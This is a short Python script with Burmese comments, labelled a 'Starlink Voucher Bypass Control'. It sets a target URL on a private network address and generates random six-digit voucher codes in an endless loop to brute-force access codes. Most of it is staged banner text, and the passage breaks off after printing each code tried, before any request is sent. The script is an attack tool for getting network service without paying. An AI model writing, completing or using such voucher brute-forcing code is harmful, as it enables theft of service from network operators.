import time
import random
import os
import sys
import requests

# အရောင်များ
RED = '\033[91m'      # Fail
GREEN = '\033[92m'    # Success
WHITE = '\033[97m'    # Testing
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_scanning():
    os.system('clear')
    
    # ဗီဒီယိုထဲကလို တစ်ဆင့်ချင်းစီ စာတန်းတက်လာစေရန်
    print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
    time.sleep(0.8)
    print(f"{WHITE}[+] Range: 000000 - 999999 (Randomly Searching){END}")
    time.sleep(0.8)
    print(f"{YELLOW}[!] Scanning in progress...{END}")
    time.sleep(1.2)
    print(f"\n{CYAN}[+] Checking Bypass...{END}")
    time.sleep(1)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
    time.sleep(1)
    print(f"{WHITE}[*] Currently Testing codes...{END}\n")
    time.sleep(0.5)

    while True:
        code = str(random.randint(0, 999999)).zfill(6)
        
        # Testing စာတန်းကို အောက်ဆုံးမှာပဲ ပြောင်းနေစေရန်
        sys.stdout.write(f"{WHITE}\r[*] Trying: {code}{END}")
